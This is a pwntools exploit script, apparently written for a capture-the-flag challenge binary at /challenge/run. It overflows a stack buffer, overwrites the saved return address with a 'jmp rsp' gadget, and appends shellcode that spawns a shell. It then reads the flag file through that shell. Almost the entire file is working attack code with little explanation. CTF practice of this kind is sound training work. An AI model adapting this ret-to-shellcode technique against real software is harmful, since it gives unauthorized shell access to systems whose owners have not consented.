#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/run
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "/challenge/run")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
b vuln
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

io = start()

target_fn = 0x401146

unbound_buffer = 0x7FFDE3E76C00
saved_rip = 0x7FFDE3E76C48
offset = saved_rip - unbound_buffer

payload_padding = b"F" * offset  # pad until saved_rip
payload_rip = p64(target_fn)  # in this challenge, we target the jmp rsp code
payload_shellcode = asm(shellcraft.sh())  # from pwn
payload = payload_padding + payload_rip + payload_shellcode + b"\n"

io.send(payload)
print("[>>>] Sending payload...")

# root shell gained
io.send(b"cat /flag \n")

io.interactive()
